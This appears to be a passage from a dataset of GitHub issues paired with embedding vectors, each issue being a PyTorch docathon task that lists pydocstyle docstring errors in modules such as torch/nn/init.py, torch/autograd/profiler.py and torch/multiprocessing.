 -0.08139172  0.01891249  0.13693818 -0.22034422 -0.20461941  0.21266067
 -0.07606647  0.08744751 -0.11129785  0.1107482  -0.23257242  0.10919578
  0.2775616  -0.00901905 -0.13160291  0.5838703   0.06697681 -0.22915217
  0.20069647  0.15478173 -0.07169497  0.01849807 -0.08515723  0.2476658
  0.06283274  0.06786814  0.33438128  0.2495345  -0.22842804  0.06976054
 -0.2472884  -0.28170827 -0.02897795  0.33482164 -0.50785553 -0.00492916
 -0.35801017 -0.37017995 -0.06379712  0.00315015  0.03256905  0.15745862
  0.01890586  0.04976828  0.19215387 -0.10319228  0.32507384  0.11215238
  0.377219   -0.2532612   0.00509385  0.33914465  0.05243517  0.20916651
 -0.15042803 -0.05421439 -0.01121188 -0.08503273  0.06418511 -0.3494795
 -0.18825305 -0.07485802  0.00433831 -0.04859293  0.15164672  0.08728763
  0.13361675 -0.10844088  0.13495138 -0.12997437 -0.00725504  0.07146298
  0.28961506  0.06639626 -0.15173686 -0.07504586 -0.17664212  0.01749271
  0.1830531   0.24473599 -0.01621464  0.13983566  0.09804486  0.01512884
  0.20175661  0.04575409  0.08569428 -0.060669    0.1196461   0.10168078
 -0.166302    0.22843812  0.2792123   0.11641522 -0.153103   -0.21255064
  0.06419166 -0.01105129 -0.28688532 -0.43005538 -0.14495055 -0.332833
  0.28031066  0.1692258  -0.41309977  0.3544274   0.09525882  0.24245101
  0.02852326  0.04674671 -0.19180033  0.4639415   0.02104604  0.02047606
  0.39512324  0.08356841 -0.04381335 -0.3575812  -0.10678951  0.07533418
 -0.0305895   0.03709868 -0.24482574  0.14242575 -0.22593997 -0.23871808
 -0.46773538 -0.19764611 -0.03509821  0.15434946  0.0415101  -0.00435934
  0.13791254  0.17360073 -0.02426849 -0.3459361   0.01759863  0.3759719
  0.12634826  0.5642514   0.13875161  0.01214761 -0.18927208  0.20228115
  0.2171867  -0.08956143  0.21942914  0.2987654  -0.10891394 -0.30777916
 -0.00235909 -0.00489165 -0.12323655 -0.0269182   0.2563077   0.5178417
  0.04738109  0.2846917  -0.30304784  0.26542744  0.3029715  -0.1813888
  0.45725164 -0.10155729 -0.42523742 -0.31295922 -0.19765538  0.13229994
 -0.3461386  -0.15145975  0.10461737 -0.27713683 -0.20187272  0.29890344
 -0.04841932 -0.3925983   0.35656592  0.01159303 -0.2552881  -0.01277007
 -0.155983   -0.28230974  0.2882508   0.20086804 -0.05323067 -0.2758608
 -0.02528526 -0.12344654 -0.05383275 -0.19258004  0.48900285 -0.16577707
  0.14153068  0.27761978 -0.15471116 -0.12215269  0.21009213  0.34414163
 -0.31550056 -0.23736914 -0.06654716 -0.0246562   0.14304565 -0.03585459
 -0.23149785  0.16002777 -0.2938134   0.04579531 -0.12553675 -0.31138623
 -0.00747712 -0.05482937  0.6056715  -0.0496287  -0.15706967 -0.03216255
 -0.045078    0.03807681 -0.05626068  0.2889663  -0.08546475  0.17411304
  0.28547758 -0.23731914 -0.2127331   0.17371345 -0.22860846 -0.09499944
  0.19128983 -0.58781505  0.3458982   0.2119473   0.36013538  0.00280182
  0.31987026 -0.08329545  0.08750522  0.04821033 -0.19053663  0.35504878
 -0.4087809  -0.00767415  0.32518086 -0.2067412  -0.14738567 -0.01403691
 -0.4709708  -0.22435524 -0.20995274  0.15097842  0.239387    0.01946317
  0.06241541  0.2282744  -0.1318418   0.04201972  0.25075555  0.19977595
 -0.34767532 -0.05125041 -0.13999876  0.40632585  0.04666766  0.32677323
  0.07110057  0.09793642  0.19868681 -0.2980197   0.35696906  0.382536
 -0.31250116  0.36295217 -0.07464376  0.10812268 -0.09689409  0.4226961
  0.16066946  0.24554878 -0.08259054 -0.42355365 -0.29219085  0.02122602
 -0.05361679 -0.07246658 -0.54618233  0.04312086 -0.30175233 -0.21873261
  0.1869762   0.11482938 -0.11153048 -0.02945596 -0.06704717 -0.02513213
 -0.12083152  0.22658503 -0.11582708 -0.21278103 -0.04912511 -0.35770705
  0.04081572 -0.5195738  -0.0728149  -0.07430522  0.19978887  0.17867026
 -0.5367493  -0.33017665  0.540285    0.01117411 -0.45440227  0.1264575
 -0.16326325  0.4795881   0.04666872  0.3359071  -0.08481001  0.3531921
 -0.60476506 -0.07250068 -0.25953698 -0.22121172 -0.09816512 -0.33720335
 -0.10604809  0.02289174  0.18787266 -0.05907957 -0.29765612  0.22177717
 -0.23849419  0.246076    0.39668566  0.13131638  0.00511132  0.09288976
 -0.08151956 -0.3574695  -0.29774332  0.41522127  0.4408914  -0.04461906]"
Fix docstring errors in init.py module: docs triaged medium docathon-h2-2023,"Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/init.py`, **Entity**: `calculate_gain`, **Line**: 68, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `uniform_`, **Line**: 123, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `uniform_`, **Line**: 123, **Description**: First line should end with a period (not 'm')
- **File**: `torch/nn/init.py`, **Entity**: `uniform_`, **Line**: 123, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `normal_`, **Line**: 141, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `normal_`, **Line**: 141, **Description**: First line should end with a period (not 'l')
- **File**: `torch/nn/init.py`, **Entity**: `normal_`, **Line**: 141, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `trunc_normal_`, **Line**: 165, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `trunc_normal_`, **Line**: 165, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/init.py`, **Entity**: `trunc_normal_`, **Line**: 165, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `constant_`, **Line**: 187, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `ones_`, **Line**: 203, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `zeros_`, **Line**: 216, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `eye_`, **Line**: 229, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `eye_`, **Line**: 229, **Description**: First line should end with a period (not 'y')
- **File**: `torch/nn/init.py`, **Entity**: `eye_`, **Line**: 229, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `dirac_`, **Line**: 249, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `dirac_`, **Line**: 249, **Description**: First line should end with a period (not 'c')
- **File**: `torch/nn/init.py`, **Entity**: `dirac_`, **Line**: 249, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `xavier_uniform_`, **Line**: 311, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `xavier_uniform_`, **Line**: 311, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/init.py`, **Entity**: `xavier_uniform_`, **Line**: 311, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `xavier_normal_`, **Line**: 338, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `xavier_normal_`, **Line**: 338, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/init.py`, **Entity**: `xavier_normal_`, **Line**: 338, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `kaiming_uniform_`, **Line**: 376, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `kaiming_uniform_`, **Line**: 376, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/init.py`, **Entity**: `kaiming_uniform_`, **Line**: 376, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `kaiming_normal_`, **Line**: 425, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `kaiming_normal_`, **Line**: 425, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/init.py`, **Entity**: `kaiming_normal_`, **Line**: 425, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `orthogonal_`, **Line**: 462, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `orthogonal_`, **Line**: 462, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/init.py`, **Entity**: `orthogonal_`, **Line**: 462, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `sparse_`, **Line**: 507, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `sparse_`, **Line**: 507, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/init.py`, **Entity**: `sparse_`, **Line**: 507, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')

cc @carljparker",False,"[-0.1231723  -0.12176508 -0.0443678   0.01408219  0.13897076 -0.18548517
 -0.02533527  0.2032224  -0.38017684  0.11551832 -0.00365787 -0.0727586
  0.11435327  0.14434446 -0.05719084  0.0322439  -0.27849048 -0.5433936
  0.06995709  0.05214024  0.07275935  0.49755448 -0.01935586  0.07130592
  0.06637412  0.15931708 -0.38054952 -0.06845537  0.00949611  0.15875559
  0.22493052  0.13169587 -0.38902372  0.07618567  0.46627644  0.3069523
 -0.11791483 -0.11168624 -0.02747201  0.06256172  0.02270398 -0.21050946
 -0.14019778  0.03397326  0.1335403  -0.13754722 -0.2995599   0.22849782
 -0.09092763  0.08824444 -0.06358401  0.08511527 -0.20864661  0.10682106
  0.2558648   0.00568775 -0.20548712  0.5314867   0.08380867 -0.21281338
  0.06258641  0.21782453 -0.0985218   0.01926385 -0.10151808  0.26509762
 -0.00425357  0.2048225   0.23467107  0.20317756 -0.13602872  0.10225925
 -0.2541421  -0.2817991  -0.03004656  0.3122829  -0.42888522  0.02368599
 -0.27030793 -0.36710396 -0.11679043  0.08012853  0.02108431  0.29784742
  0.11445893 -0.06851755  0.26915747 -0.08811419  0.4210496   0.17451213
  0.28106952 -0.22193605 -0.07636329  0.3858403   0.14808697  0.2617079
 -0.17501721 -0.03968765 -0.00762858 -0.08140262  0.10437572 -0.3998137
 -0.2183592   0.07888813  0.02642566 -0.08139871  0.10237138  0.1235883
  0.2084443  -0.03820675  0.1792692  -0.09946144 -0.04033184  0.11008926
  0.28417373  0.09863514 -0.13159855 -0.04515038 -0.210142    0.09687202
  0.21134469  0.27013427  0.0248842   0.14877944  0.05902532 -0.02962789
  0.30187008 -0.0235664   0.04931348 -0.09314443  0.14770947  0.04377665
 -0.29698503  0.08069031  0.30571985  0.15684152 -0.10769677 -0.21580881
 -0.10899431  0.0214126  -0.19141775 -0.34212077 -0.13046822 -0.22155376
  0.24676523  0.27303445 -0.3950646   0.37358907  0.02242848  0.13601789
 -0.12141905  0.00298739 -0.29603526  0.44326472  0.01414711 -0.09442365
  0.37693498  0.11518541  0.00267141 -0.3135419  -0.12747264  0.07591969
 -0.11223719  0.03374059 -0.15511978  0.10915936 -0.27501214 -0.24406299
 -0.42643267 -0.22563767 -0.08027707 -0.01333833  0.00993467 -0.01017388
  0.21569562  0.09412903 -0.01861948 -0.19921002 -0.02973564  0.25259733
  0.19302328  0.5906808   0.13835818  0.0217815  -0.1784457   0.11461502
  0.2323876  -0.03338614  0.11132894  0.23520511 -0.08097781 -0.23982672
  0.06178565  0.06949264 -0.08194932 -0.07873607  0.17531747  0.43446642
 -0.0360044   0.3136751  -0.2527558   0.30414975  0.3012039  -0.22670266
  0.480876   -0.00773073 -0.591596   -0.28070343 -0.15416983  0.13484326
 -0.30538607 -0.21023369  0.09949025 -0.26747742 -0.17555745  0.2740729
 -0.03716116 -0.30654395  0.36397853 -0.09611186 -0.39647752 -0.0864111
 -0.12118673 -0.2646626   0.28606546  0.15247983  0.04008979 -0.23282535
  0.03339579 -0.10376221  0.04112484 -0.14715524  0.54708624 -0.14445013
  0.11946724  0.21455908 -0.07553208 -0.14097133  0.19252357  0.2628394
 -0.22043672 -0.21877787  0.07232678 -0.0233763   0.12940511 -0.1142747
 -0.15630671  0.04315382 -0.3376197   0.06703494  0.00208626 -0.33196795
  0.00873098 -0.05775386  0.6143421  -0.02324591 -0.1932278   0.02540197
 -0.06642143 -0.029806   -0.05355947  0.30688298 -0.14648102  0.10629702
  0.26940787 -0.2873634  -0.22053844  0.17542799 -0.25039795 -0.22712156
  0.17815155 -0.5512489   0.34694302  0.2135026   0.35341358  0.01097407
  0.29974586 -0.08234536  0.15729427 -0.02242698 -0.14608686  0.3753591
 -0.3903628  -0.0195655   0.2971915  -0.1266394  -0.15452734 -0.02886665
 -0.5346533  -0.205275   -0.2513275   0.16931067  0.2094207   0.10175987
 -0.01569402  0.16093138 -0.03403341  0.1082151   0.27464378  0.14702508
 -0.3589352  -0.01729097 -0.15515883  0.3703786  -0.09891005  0.25682855
  0.03478837  0.08251363  0.2269807  -0.24329533  0.28954583  0.38515216
 -0.25456402  0.32222468 -0.0700039   0.09122587 -0.05207468  0.37512672
  0.00794861  0.18136379 -0.10847802 -0.40640888 -0.19889122  0.15319006
 -0.03479425 -0.03633954 -0.43308315  0.15981154 -0.38972735 -0.23342288
  0.26668411 -0.00539863 -0.09354378 -0.09224387 -0.0477002  -0.10220858
 -0.07668972  0.19346194 -0.0854504  -0.2629234  -0.00464002 -0.30027312
  0.0460141  -0.5377734  -0.02934525 -0.0540249   0.1456986   0.20825653
 -0.43627933 -0.32387012  0.5070741  -0.02364298 -0.4044358   0.10411291
 -0.22752877  0.45338792  0.05953123  0.3130022  -0.07716294  0.30986312
 -0.6169746  -0.02661687 -0.10984677 -0.2706129  -0.08902831 -0.24814329
 -0.09718465 -0.04192515  0.22427095 -0.26438373 -0.32678607  0.13854444
 -0.23471646  0.2055214   0.43879637  0.16211069  0.10096676 -0.07602949
  0.08266366 -0.25769496 -0.38082677  0.32021153  0.3526854  -0.01231417]"
"Fix docstring errors in reductions.py, spawn.py, pool.py, parameter.py, cpp.py, grad.py, __init__.py, profiler.py, queue.py, graph.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/autograd/profiler.py`, **Entity**: `profile`, **Line**: 86, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `profile`, **Line**: 86, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `self_cpu_time_total`, **Line**: 356, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `self_cpu_time_total`, **Line**: 356, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/autograd/profiler.py`, **Entity**: `self_cpu_time_total`, **Line**: 356, **Description**: First line should end with a period (not 'f')
- **File**: `torch/autograd/profiler.py`, **Entity**: `record_function`, **Line**: 498, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `record_function`, **Line**: 498, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `record_function`, **Line**: 498, **Description**: First line should end with a period (not 'f')
- **File**: `torch/autograd/profiler.py`, **Entity**: `_call_end_callbacks_on_future`, **Line**: 563, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `_call_end_callbacks_on_future`, **Line**: 563, **Description**: First line should end with a period (not 'c')
- **File**: `torch/autograd/profiler.py`, **Entity**: `emit_itt`, **Line**: 604, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `emit_nvtx`, **Line**: 671, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `load_nvprof`, **Line**: 788, **Description**: First line should be in imperative mood (perhaps 'Open', not 'Opens')
- **File**: `torch/autograd/profiler.py`, **Entity**: `EnforceUnique`, **Line**: 797, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `KinetoStepTracker`, **Line**: 872, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `KinetoStepTracker`, **Line**: 872, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `increment_step`, **Line**: 920, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/graph.py`, **Entity**: `name`, **Line**: 23, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/autograd/graph.py`, **Entity**: `metadata`, **Line**: 43, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/autograd/graph.py`, **Entity**: `register_hook`, **Line**: 52, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/autograd/graph.py`, **Entity**: `register_prehook`, **Line**: 90, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/autograd/graph.py`, **Entity**: `increment_version`, **Line**: 133, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/graph.py`, **Entity**: `increment_version`, **Line**: 133, **Description**: First line should end with a period (not 'd')
- **File**: `torch/autograd/graph.py`, **Entity**: `increment_version`, **Line**: 133, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/autograd/graph.py`, **Entity**: `saved_tensors_hooks`, **Line**: 148, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/graph.py`, **Entity**: `save_on_cpu`, **Line**: 220, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/graph.py`, **Entity**: `save_on_cpu`, **Line**: 220, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/graph.py`, **Entity**: `save_on_cpu`, **Line**: 220, **Description**: First line should end with a period (not 'e')
- **File**: `torch/autograd/graph.py`, **Entity**: `register_multi_grad_hook`, **Line**: 317, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/autograd/graph.py`, **Entity**: `allow_mutation_on_saved_tensors`, **Line**: 527, **Description**: First line should end with a period (not 'd')
- **File**: `torch/multiprocessing/pool.py`, **Entity**: `Pool`, **Line**: 17, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/pool.py`, **Entity**: `Pool`, **Line**: 17, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/multiprocessing/pool.py`, **Entity**: `_repopulate_pool`, **Line**: 28, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/pool.py`, **Entity**: `_repopulate_pool`, **Line**: 28, **Description**: First line should end with a period (not ',')
- **File**: `torch/multiprocessing/queue.py`, **Entity**: `ConnectionWrapper`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/queue.py`, **Entity**: `ConnectionWrapper`, **Line**: 8, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/multiprocessing/queue.py`, **Entity**: `ConnectionWrapper`, **Line**: 8, **Description**: First line should end with a period (not 'o')
- **File**: `torch/multiprocessing/reductions.py`, **Entity**: `StorageWeakRef`, **Line**: 23, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/multiprocessing/reductions.py`, **Entity**: `SharedCache`, **Line**: 59, **Description**: First line should end with a period (not 'f')
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `ProcessRaisedException`, **Line**: 26, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `ProcessRaisedException`, **Line**: 26, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `ProcessRaisedException`, **Line**: 26, **Description**: First line should end with a period (not 'n')
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `ProcessExitedException`, **Line**: 40, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `ProcessExitedException`, **Line**: 40, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `ProcessExitedException`, **Line**: 40, **Description**: First line should end with a period (not 'l')
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `join`, **Line**: 92, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `join`, **Line**: 92, **Description**: First line should be in imperative mood (perhaps 'Try', not 'Tries')
- **File**: `torch/multiprocessing/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not '`')
- **File**: `torch/multiprocessing/__init__.py`, **Entity**: `set_sharing_strategy`, **Line**: 51, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/multiprocessing/__init__.py`, **Entity**: `get_sharing_strategy`, **Line**: 63, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/multiprocessing/__init__.py`, **Entity**: `get_all_sharing_strategies`, **Line**: 68, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/__init__.py`, **Entity**: `factory_kwargs`, **Line**: 14, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/__init__.py`, **Entity**: `factory_kwargs`, **Line**: 14, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/cpp.py`, **Entity**: `OrderedDictWrapper`, **Line**: 7, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/cpp.py`, **Entity**: `OrderedDictWrapper`, **Line**: 7, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/cpp.py`, **Entity**: `ModuleWrapper`, **Line**: 50, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/cpp.py`, **Entity**: `ModuleWrapper`, **Line**: 50, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/grad.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/grad.py`, **Entity**: `conv1d_input`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/grad.py`, **Entity**: `conv1d_input`, **Line**: 8, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/grad.py`, **Entity**: `conv1d_weight`, **Line**: 40, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/grad.py`, **Entity**: `conv2d_input`, **Line**: 71, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/grad.py`, **Entity**: `conv2d_input`, **Line**: 71, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/grad.py`, **Entity**: `conv2d_weight`, **Line**: 103, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/grad.py`, **Entity**: `conv3d_input`, **Line**: 134, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/grad.py`, **Entity**: `conv3d_input`, **Line**: 134, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/grad.py`, **Entity**: `conv3d_weight`, **Line**: 166, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/parameter.py`, **Entity**: `Parameter`, **Line**: 14, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/parameter.py`, **Entity**: `materialize`, **Line**: 105, **Description**: 1 blank line required between summary line and description (found 0)

cc @carljparker",False,"[-0.10973398 -0.21505286  0.01099078 -0.16739097  0.14841288 -0.04717149
  0.03690678  0.01334398 -0.42205504  0.18525386 -0.03988824  0.03499254
  0.13165165  0.28564572 -0.07805298  0.1245258  -0.26119554 -0.34443265
  0.24653374  0.2633114   0.21256882  0.45849666 -0.12064864  0.05828252
 -0.1904249   0.09440775 -0.43185398 -0.32158005  0.03288133 -0.02235769
  0.23257168  0.35323313 -0.27633277 -0.08022381  0.4498927   0.4141732
 -0.24663024 -0.13558024 -0.05223813  0.21203998  0.04500703 -0.12414069
 -0.22161077  0.00506417  0.02690179 -0.26206195 -0.17708111  0.17149785
 -0.17259598  0.09014212 -0.09917844  0.07282908 -0.27090812  0.00779712
  0.16916472  0.1528486  -0.01654819  0.48998302  0.00332259 -0.02568843
  0.01519794  0.24788827 -0.0312426   0.21653906 -0.07290965  0.23027386
  0.07942647  0.3141505   0.5241675  -0.03093429 -0.10831293  0.09715061
 -0.45235652 -0.31243318  0.03936591  0.41049615 -0.27432212 -0.08217004
 -0.1319049  -0.38145623 -0.25887114 -0.12389594  0.10837584  0.09900746
  0.03102232 -0.20449123  0.21950066 -0.16266638  0.18284893  0.2513723
  0.51173794 -0.20894305 -0.07016055  0.38365376  0.01862429  0.36900726
 -0.10133909 -0.00841221  0.15367435 -0.2352953   0.11311594 -0.26014712
  0.01356215  0.22902584  0.04163166 -0.17408577  0.12908858 -0.03671204
  0.31894395  0.10834301  0.1038738  -0.23559868  0.32115662  0.28248903
  0.33714887  0.0980754  -0.25370592  0.10326403 -0.2953086   0.0383041
  0.28948385  0.26156607  0.17874224  0.11533481 -0.04299291  0.05104076
  0.13140918 -0.08620415  0.0802438  -0.4406221   0.25547332 -0.03009349
 -0.15548602  0.05221708  0.22080986  0.13057095 -0.17261133 -0.3988973
 -0.16096146 -0.1368564  -0.32515475 -0.35928884 -0.18235585 -0.24389039
  0.25262466  0.4832002  -0.4169255   0.336558   -0.08141173  0.0229903
 -0.12325113  0.20020431 -0.29400647  0.37712035 -0.03013346  0.0878948
  0.45293397  0.06076588 -0.07515033 -0.37460503  0.01531312  0.21532473
 -0.02012815  0.01322512 -0.23249884  0.18885368 -0.07188123 -0.1648075
 -0.43273997 -0.13228276  0.02514653  0.19545998 -0.11730322 -0.3412614
  0.22766829  0.06606635 -0.31094158 -0.28074425  0.04213279  0.28205618
 -0.05005511  0.5743103   0.01554166 -0.04318566 -0.16961667  0.08219185
  0.09396036 -0.12042734  0.25386193  0.44126493 -0.04403907 -0.2422842
  0.21048114  0.05160626 -0.14379838 -0.0656856   0.32353026  0.62179524
  0.10741698  0.2726285   0.00763289  0.1733186   0.41940174 -0.06905589
  0.40724188 -0.0688428  -0.41365758 -0.2832739  -0.28958166 -0.01511433
 -0.44126928 -0.16453665 -0.02239257 -0.39696983 -0.14833397  0.37561762
  0.27883643 -0.25795573  0.21953762 -0.26738155 -0.35368037 -0.05282549
 -0.16728005 -0.24133497  0.34440845  0.19567621  0.05868912  0.01710026
  0.01092459 -0.00531199 -0.0012118  -0.023941    0.65659416 -0.29695964
  0.09569187  0.15891974  0.07215439  0.06777494  0.07215398  0.29068384
 -0.117053   -0.1735486  -0.15651157 -0.01924319  0.17014882 -0.35473543
 -0.22920103 -0.02716334 -0.35736984  0.069618   -0.15302864 -0.37084138
  0.28991225  0.02013033  0.5044669  -0.02334159 -0.42996395 -0.08111521
 -0.01250302 -0.00626583  0.03912785  0.22918567 -0.12620974  0.19608471
  0.3364892  -0.24312705 -0.26873693  0.13222659  0.19226533 -0.15719038
  0.2949505  -0.5739082   0.40241557  0.14670582  0.28611216  0.16257915
  0.29595625  0.08994409  0.08172328 -0.11136387 -0.1788008   0.5698036
 -0.44875118 -0.13983281  0.30066037 -0.10553978 -0.06009986 -0.31165057
 -0.65312505 -0.17073706 -0.10944563  0.06474122  0.39577347  0.03420983
 -0.18119031  0.13903135  0.1708424   0.30270898  0.20769498  0.00392605
 -0.53648084 -0.12721893  0.05723381  0.1831701   0.20427811  0.27848303
  0.20420447 -0.00688553  0.10625617 -0.3883785   0.36508632  0.31392062
 -0.33607253  0.1305249   0.07188017 -0.12523952 -0.06366375  0.5489745
  0.24307056  0.05303477 -0.13408092 -0.37671146 -0.20768778  0.02248549
  0.14877145 -0.11381222 -0.37770748  0.07749939 -0.18586892 -0.42972544
  0.2932104   0.10940161 -0.05704251 -0.10866112 -0.02018427 -0.04364308
 -0.23316982  0.24021581  0.00203495 -0.40567204 -0.17496744 -0.1323411
  0.10806327 -0.559965   -0.10439928 -0.12613605  0.04723831  0.17223638
 -0.4292179  -0.49675274  0.58945286 -0.0018384  -0.23900579 -0.01379402
  0.00165832  0.46081963 -0.02052783  0.15759014 -0.04414067  0.31840056
 -0.6025882  -0.09116308 -0.23851532 -0.47222775  0.00139528 -0.30544803
 -0.18522349  0.01155221  0.21386744 -0.11010337 -0.3864476   0.08548649
 -0.1873872   0.23089966  0.3740409   0.28016874  0.17864281 -0.08892395
  0.04111221 -0.2766691  -0.44328374  0.3190548   0.37603652 -0.34134078]"
